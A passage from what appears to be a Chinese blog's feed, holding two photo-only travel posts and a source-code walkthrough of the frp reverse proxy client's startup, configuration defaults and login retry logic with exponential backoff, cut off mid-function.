      <url>/2025/02/08/%E7%94%9F%E6%B4%BB/%E6%BA%9C%E8%BE%BE/%E5%A4%A7%E8%A7%89%E7%A6%85%E5%AF%BA/</url>
      
        <content type="html"><![CDATA[<p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/1749373404604.jpg" alt="1749373404604"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/1749373404653.jpg" alt="1749373404653"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/1749373404645.jpg" alt="1749373404645"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/1749373404638.jpg" alt="1749373404638"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/1749373404630.jpg" alt="1749373404630"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/1749373404621.jpg" alt="1749373404621"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/1749373404613.jpg" alt="1749373404613"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/1749373404596.jpg" alt="1749373404596"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/1749373404587.jpg" alt="1749373404587"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/1749373404576.jpg" alt="1749373404576"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/1749373404565.jpg" alt="1749373404565"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/1749373404557.jpg" alt="1749373404557"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/1749373404551.jpg" alt="1749373404551"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/1749373404535.jpg" alt="1749373404535"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/1749373404523.jpg" alt="1749373404523"></p>]]></content>
      
      
      <categories>
          
          <category> 生活 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 溜达 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>景山公园</title>
      <link href="/2025/02/08/%E7%94%9F%E6%B4%BB/%E6%BA%9C%E8%BE%BE/%E6%99%AF%E5%B1%B1%E5%85%AC%E5%9B%AD/"/>
      <url>/2025/02/08/%E7%94%9F%E6%B4%BB/%E6%BA%9C%E8%BE%BE/%E6%99%AF%E5%B1%B1%E5%85%AC%E5%9B%AD/</url>
      
        <content type="html"><![CDATA[<p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/1749373585301.jpg" alt="1749373585301"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/1749373585289.jpg" alt="1749373585289"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/1749373585275.jpg" alt="1749373585275"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/1749373585262.jpg" alt="1749373585262"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/1749373585251.jpg" alt="1749373585251"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/1749373585241.jpg" alt="1749373585241"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/1749373585229.jpg" alt="1749373585229"></p>]]></content>
      
      
      <categories>
          
          <category> 生活 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 溜达 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>frp 源码学习</title>
      <link href="/2024/12/28/%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/frp/"/>
      <url>/2024/12/28/%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/frp/</url>
      
        <content type="html"><![CDATA[<h2 id="项目介绍"><a href="#项目介绍" class="headerlink" title="项目介绍"></a>项目介绍</h2><p>项目地址：<a href="https://github.com/fatedier/frp">https://github.com/fatedier/frp</a></p><p>使用文档：<a href="https://gofrp.org/">https://gofrp.org</a></p><p>目前版本：0.61</p><p>frp 是一个专注于内网穿透的高性能的反向代理应用，支持 TCP、UDP、HTTP、HTTPS 等多种协议，且支持 P2P 通信。可以将内网服务以安全、便捷的方式通过具有公网 IP 节点的中转暴露到公网。</p><h2 id="简要流程"><a href="#简要流程" class="headerlink" title="简要流程"></a>简要流程</h2><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/frp-20241208130601-6cs3mhc.drawio%202-20241216213148-oj21kq0.png?imageSlim" alt="frp-20241208130601-6cs3mhc.drawio 2">​</p><h2 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h2><h3 id="初始化部分"><a href="#初始化部分" class="headerlink" title="初始化部分"></a>初始化部分</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">runClient</span><span class="hljs-params">(cfgFilePath <span class="hljs-type">string</span>)</span></span> <span class="hljs-type">error</span> &#123;<br><span class="hljs-comment">// 加载配置文件</span><br>cfg, proxyCfgs, visitorCfgs, isLegacyFormat, err := config.LoadClientConfig(cfgFilePath, strictConfigMode)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br><span class="hljs-keyword">if</span> isLegacyFormat &#123;<br>fmt.Printf(<span class="hljs-string">&quot;WARNING: ini format is deprecated and the support will be removed in the future, &quot;</span> +<br><span class="hljs-string">&quot;please use yaml/json/toml format instead!\n&quot;</span>)<br>&#125;<br><span class="hljs-comment">// 验证</span><br>warning, err := validation.ValidateAllClientConfig(cfg, proxyCfgs, visitorCfgs)<br><span class="hljs-keyword">if</span> warning != <span class="hljs-literal">nil</span> &#123;<br>fmt.Printf(<span class="hljs-string">&quot;WARNING: %v\n&quot;</span>, warning)<br>&#125;<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br><span class="hljs-comment">// 开启服务</span><br><span class="hljs-keyword">return</span> startService(cfg, proxyCfgs, visitorCfgs, cfgFilePath)<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">startService</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">cfg *v1.ClientCommonConfig,</span></span><br><span class="hljs-params"><span class="hljs-function">proxyCfgs []v1.ProxyConfigurer,</span></span><br><span class="hljs-params"><span class="hljs-function">visitorCfgs []v1.VisitorConfigurer,</span></span><br><span class="hljs-params"><span class="hljs-function">cfgFile <span class="hljs-type">string</span>,</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span> <span class="hljs-type">error</span> &#123;<br>log.InitLogger(cfg.Log.To, cfg.Log.Level, <span class="hljs-type">int</span>(cfg.Log.MaxDays), cfg.Log.DisablePrintColor)<br><br><span class="hljs-keyword">if</span> cfgFile != <span class="hljs-string">&quot;&quot;</span> &#123;<br>log.Infof(<span class="hljs-string">&quot;start frpc service for config file [%s]&quot;</span>, cfgFile)<br><span class="hljs-keyword">defer</span> log.Infof(<span class="hljs-string">&quot;frpc service for config file [%s] stopped&quot;</span>, cfgFile)<br>&#125;<br><span class="hljs-comment">// 客户端服务</span><br>svr, err := client.NewService(client.ServiceOptions&#123;<br>Common:         cfg,<br>ProxyCfgs:      proxyCfgs,<br>VisitorCfgs:    visitorCfgs,<br>ConfigFilePath: cfgFile,<br>&#125;)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br><span class="hljs-comment">// 优雅关闭</span><br>shouldGracefulClose := cfg.Transport.Protocol == <span class="hljs-string">&quot;kcp&quot;</span> || cfg.Transport.Protocol == <span class="hljs-string">&quot;quic&quot;</span><br><span class="hljs-comment">// Capture the exit signal if we use kcp or quic.</span><br><span class="hljs-keyword">if</span> shouldGracefulClose &#123;<br><span class="hljs-keyword">go</span> handleTermSignal(svr)<br>&#125;<br><span class="hljs-comment">// 运行服务</span><br><span class="hljs-keyword">return</span> svr.Run(context.Background())<br>&#125;<br><br><span class="hljs-comment">// 优雅关闭</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">handleTermSignal</span><span class="hljs-params">(svr *client.Service)</span></span> &#123;<br>ch := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> os.Signal, <span class="hljs-number">1</span>)<br>signal.Notify(ch, syscall.SIGINT, syscall.SIGTERM)<br>&lt;-ch<br>svr.GracefulClose(<span class="hljs-number">500</span> * time.Millisecond)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(svr *Service)</span></span> GracefulClose(d time.Duration) &#123;<br>svr.gracefulShutdownDuration = d<br>svr.cancel(<span class="hljs-literal">nil</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p>新建服务这里还有一些参数的配置：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">NewService</span><span class="hljs-params">(options ServiceOptions)</span></span> (*Service, <span class="hljs-type">error</span>) &#123;<br><span class="hljs-comment">// 设置默认参数</span><br>setServiceOptionsDefault(&amp;options)<br><br><span class="hljs-keyword">var</span> webServer *httppkg.Server<br><span class="hljs-keyword">if</span> options.Common.WebServer.Port &gt; <span class="hljs-number">0</span> &#123;<br>ws, err := httppkg.NewServer(options.Common.WebServer)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br>webServer = ws<br>&#125;<br>s := &amp;Service&#123;<br>ctx:              context.Background(),<br><span class="hljs-comment">// 认证</span><br>authSetter:       auth.NewAuthSetter(options.Common.Auth),<br>webServer:        webServer,<br>common:           options.Common,<br>configFilePath:   options.ConfigFilePath,<br>proxyCfgs:        options.ProxyCfgs,<br><span class="hljs-comment">// 普通的 TCP 不需要</span><br>visitorCfgs:      options.VisitorCfgs,<br>clientSpec:       options.ClientSpec,<br>connectorCreator: options.ConnectorCreator,<br>handleWorkConnCb: options.HandleWorkConnCb,<br>&#125;<br><span class="hljs-keyword">if</span> webServer != <span class="hljs-literal">nil</span> &#123;<br>webServer.RouteRegister(s.registerRouteHandlers)<br>&#125;<br><span class="hljs-keyword">return</span> s, <span class="hljs-literal">nil</span><br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">setServiceOptionsDefault</span><span class="hljs-params">(options *ServiceOptions)</span></span> &#123;<br><span class="hljs-keyword">if</span> options.Common != <span class="hljs-literal">nil</span> &#123;<br>options.Common.Complete()<br>&#125;<br><span class="hljs-keyword">if</span> options.ConnectorCreator == <span class="hljs-literal">nil</span> &#123;<br>options.ConnectorCreator = NewConnector<br>&#125;<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(c *ClientCommonConfig)</span></span> Complete() &#123;<br>c.ServerAddr = util.EmptyOr(c.ServerAddr, <span class="hljs-string">&quot;0.0.0.0&quot;</span>)<br>c.ServerPort = util.EmptyOr(c.ServerPort, <span class="hljs-number">7000</span>)<br><span class="hljs-comment">// 默认首次登录失败退出</span><br>c.LoginFailExit = util.EmptyOr(c.LoginFailExit, lo.ToPtr(<span class="hljs-literal">true</span>))<br>c.NatHoleSTUNServer = util.EmptyOr(c.NatHoleSTUNServer, <span class="hljs-string">&quot;stun.easyvoip.com:3478&quot;</span>)<br><br>c.Auth.Complete()<br>c.Log.Complete()<br>c.Transport.Complete()<br>c.WebServer.Complete()<br><br>c.UDPPacketSize = util.EmptyOr(c.UDPPacketSize, <span class="hljs-number">1500</span>)<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(c *ClientTransportConfig)</span></span> Complete() &#123;<br>c.Protocol = util.EmptyOr(c.Protocol, <span class="hljs-string">&quot;tcp&quot;</span>)<br>c.DialServerTimeout = util.EmptyOr(c.DialServerTimeout, <span class="hljs-number">10</span>)<br>c.DialServerKeepAlive = util.EmptyOr(c.DialServerKeepAlive, <span class="hljs-number">7200</span>)<br>c.ProxyURL = util.EmptyOr(c.ProxyURL, os.Getenv(<span class="hljs-string">&quot;http_proxy&quot;</span>))<br>c.PoolCount = util.EmptyOr(c.PoolCount, <span class="hljs-number">1</span>)<br><span class="hljs-comment">// 默认开启 TCP MUX 多路复用</span><br>c.TCPMux = util.EmptyOr(c.TCPMux, lo.ToPtr(<span class="hljs-literal">true</span>))<br>c.TCPMuxKeepaliveInterval = util.EmptyOr(c.TCPMuxKeepaliveInterval, <span class="hljs-number">30</span>)<br><span class="hljs-keyword">if</span> lo.FromPtr(c.TCPMux) &#123;<br><span class="hljs-comment">// If TCPMux is enabled, heartbeat of application layer is unnecessary because we can rely on heartbeat in tcpmux.</span><br><span class="hljs-comment">// 使用 TCP MUX 就关闭掉心跳检测, 使用 MUX 中的</span><br>c.HeartbeatInterval = util.EmptyOr(c.HeartbeatInterval, <span class="hljs-number">-1</span>)<br>c.HeartbeatTimeout = util.EmptyOr(c.HeartbeatTimeout, <span class="hljs-number">-1</span>)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>c.HeartbeatInterval = util.EmptyOr(c.HeartbeatInterval, <span class="hljs-number">30</span>)<br>c.HeartbeatTimeout = util.EmptyOr(c.HeartbeatTimeout, <span class="hljs-number">90</span>)<br>&#125;<br>c.QUIC.Complete()<br>c.TLS.Complete()<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(c *TLSClientConfig)</span></span> Complete() &#123;<br><span class="hljs-comment">// 默认开启 TLS </span><br>c.Enable = util.EmptyOr(c.Enable, lo.ToPtr(<span class="hljs-literal">true</span>))<br><span class="hljs-comment">// 默认禁用 TLS 自定义首字节 0x17 特征</span><br>c.DisableCustomTLSFirstByte = util.EmptyOr(c.DisableCustomTLSFirstByte, lo.ToPtr(<span class="hljs-literal">true</span>))<br>&#125;<br></code></pre></td></tr></table></figure><p>服务启动：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(svr *Service)</span></span> Run(ctx context.Context) <span class="hljs-type">error</span> &#123;<br>ctx, cancel := context.WithCancelCause(ctx)<br>svr.ctx = xlog.NewContext(ctx, xlog.FromContextSafe(ctx))<br>svr.cancel = cancel<br><br><span class="hljs-comment">// set custom DNSServer</span><br><span class="hljs-keyword">if</span> svr.common.DNSServer != <span class="hljs-string">&quot;&quot;</span> &#123;<br>netpkg.SetDefaultDNSAddress(svr.common.DNSServer)<br>&#125;<br><br><span class="hljs-keyword">if</span> svr.webServer != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>log.Infof(<span class="hljs-string">&quot;admin server listen on %s&quot;</span>, svr.webServer.Address())<br><span class="hljs-keyword">if</span> err := svr.webServer.Run(); err != <span class="hljs-literal">nil</span> &#123;<br>log.Warnf(<span class="hljs-string">&quot;admin server exit with error: %v&quot;</span>, err)<br>&#125;<br>&#125;()<br>&#125;<br><br><span class="hljs-comment">// first login to frps</span><br><span class="hljs-comment">// 首次登录 frps, 默认首次登录失败就退出</span><br><span class="hljs-comment">// 1. 尝试登录</span><br><span class="hljs-comment">// 2. 新建控制器</span><br><span class="hljs-comment">// 3. 启动消息调度器（ 消息的发送、各种响应的处理 ）</span><br><span class="hljs-comment">// 4. 向服务器注册代理</span><br>svr.loopLoginUntilSuccess(<span class="hljs-number">10</span>*time.Second, lo.FromPtr(svr.common.LoginFailExit))<br><span class="hljs-keyword">if</span> svr.ctl == <span class="hljs-literal">nil</span> &#123;<br>cancelCause := cancelErr&#123;&#125;<br>_ = errors.As(context.Cause(svr.ctx), &amp;cancelCause)<br><span class="hljs-keyword">return</span> fmt.Errorf(<span class="hljs-string">&quot;login to the server failed: %v. With loginFailExit enabled, no additional retries will be attempted&quot;</span>, cancelCause.Err)<br>&#125;<br><span class="hljs-comment">// 保持控制器工作</span><br><span class="hljs-comment">// 上面的 loopLoginUntilSuccess 已经实现了 frpc 的正常工作</span><br><span class="hljs-comment">// 这里时为了保持工作, 如果上面的退出了, 这里会再次启动</span><br><span class="hljs-keyword">go</span> svr.keepControllerWorking()<br><span class="hljs-comment">// 阻塞</span><br>&lt;-svr.ctx.Done()<br><span class="hljs-comment">// 退出</span><br>svr.stop()<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="loopLoginUntilSuccess"><a href="#loopLoginUntilSuccess" class="headerlink" title="loopLoginUntilSuccess"></a>loopLoginUntilSuccess</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs Go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(svr *Service)</span></span> loopLoginUntilSuccess(maxInterval time.Duration, firstLoginExit <span class="hljs-type">bool</span>) &#123;<br>xl := xlog.FromContextSafe(svr.ctx)<br><span class="hljs-comment">// 登录函数</span><br>loginFunc := <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> (<span class="hljs-type">bool</span>, <span class="hljs-type">error</span>) &#123;<br>xl.Infof(<span class="hljs-string">&quot;try to connect to server...&quot;</span>)<br><span class="hljs-comment">// 登录到服务端</span><br>conn, connector, err := svr.login()<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>xl.Warnf(<span class="hljs-string">&quot;connect to server error: %v&quot;</span>, err)<br><span class="hljs-keyword">if</span> firstLoginExit &#123;<br>svr.cancel(cancelErr&#123;Err: err&#125;)<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>, err<br>&#125;<br><br>svr.cfgMu.RLock()<br>proxyCfgs := svr.proxyCfgs<br>visitorCfgs := svr.visitorCfgs<br>svr.cfgMu.RUnlock()<br><span class="hljs-comment">// 默认开启连接加密</span><br>connEncrypted := <span class="hljs-literal">true</span><br><span class="hljs-keyword">if</span> svr.clientSpec != <span class="hljs-literal">nil</span> &amp;&amp; svr.clientSpec.Type == <span class="hljs-string">&quot;ssh-tunnel&quot;</span> &#123;<br>connEncrypted = <span class="hljs-literal">false</span><br>&#125;<br>sessionCtx := &amp;SessionContext&#123;<br>Common:        svr.common,<br>RunID:         svr.runID,<br>Conn:          conn,<br>ConnEncrypted: connEncrypted,<br>AuthSetter:    svr.authSetter,<br>Connector:     connector,<br>&#125;<br><span class="hljs-comment">// 客户端控制器</span><br>ctl, err := NewControl(svr.ctx, sessionCtx)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>conn.Close()<br>xl.Errorf(<span class="hljs-string">&quot;NewControl error: %v&quot;</span>, err)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>, err<br>&#125;<br>ctl.SetInWorkConnCallback(svr.handleWorkConnCb)<br><span class="hljs-comment">// 启动代理</span><br>ctl.Run(proxyCfgs, visitorCfgs)<br><span class="hljs-comment">// close and replace previous control</span><br>svr.ctlMu.Lock()<br><span class="hljs-keyword">if</span> svr.ctl != <span class="hljs-literal">nil</span> &#123;<br>svr.ctl.Close()<br>&#125;<br>svr.ctl = ctl<br>svr.ctlMu.Unlock()<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>, <span class="hljs-literal">nil</span><br>&#125;<br><br><span class="hljs-comment">// try to reconnect to server until success</span><br><span class="hljs-comment">// backoff 退避机制</span><br>wait.BackoffUntil(loginFunc, wait.NewFastBackoffManager(<br>wait.FastBackoffOptions&#123;<br>Duration:    time.Second,<br>Factor:      <span class="hljs-number">2</span>,<br>Jitter:      <span class="hljs-number">0.1</span>,<br>MaxDuration: maxInterval,<br>&#125;), <span class="hljs-literal">true</span>, svr.ctx.Done())<br>&#125;<br></code></pre></td></tr></table></figure><p>整个函数的逻辑就是运行 loginFunc 函数，这里就先看这个函数。</p><p>wait.BackoffUntil 退避机制介绍：</p><p>什么是退避算法？通常我们的某服务发生故障时，我们会固定间隔时间来重试一次？但这样会带来一些问题，同一时间有很多请求在重试可能会造成无意义的请求。</p><p>指数退避算法会利用抖动（随机延迟）来防止连续的冲突。 效果如下，每次间隔的时间都是指数上升，另外加了少许的随机。</p><p>相关参考链接：</p><ol><li><a href="https://blog.csdn.net/gitblog_00062/article/details/139036688">https://blog.csdn.net/gitblog_00062&#x2F;article&#x2F;details&#x2F;139036688</a></li><li><a href="https://xiaorui.cc/archives/5836">golang backoff 重试指数退避算法</a></li></ol><h4 id="svr-login"><a href="#svr-login" class="headerlink" title="svr.login()"></a>svr.login()</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs Go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(svr *Service)</span></span> login() (conn net.Conn, connector Connector, err <span class="hljs-type">error</span>) &#123;<br>xl := xlog.FromContextSafe(svr.ctx)<br><span class="hljs-comment">// 创建连接器 =&gt; defaultConnectorImpl</span><br>connector = svr.connectorCreator(svr.ctx, svr.common)<br><span class="hljs-comment">// 创建客户端到服务端的连接</span><br><span class="hljs-keyword">if</span> err = connector.Open(); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span>, err<br>&#125;<br><br><span class="hljs-keyword">defer</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>connector.Close()<br>&#125;<br>&#125;()<br><span class="hljs-comment">// 获取连接流</span><br>conn, err = connector.Connect()<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-comment">// 封装登录消息</span><br>loginMsg := &amp;msg.Login&#123;<br>Arch:      runtime.GOARCH,<br>Os:        runtime.GOOS,<br>PoolCount: svr.common.Transport.PoolCount,<br>User:      svr.common.User,<br>Version:   version.Full(),<br>Timestamp: time.Now().Unix(),<br>RunID:     svr.runID,<br>Metas:     svr.common.Metadatas,<br>&#125;<br><span class="hljs-keyword">if</span> svr.clientSpec != <span class="hljs-literal">nil</span> &#123;<br>loginMsg.ClientSpec = 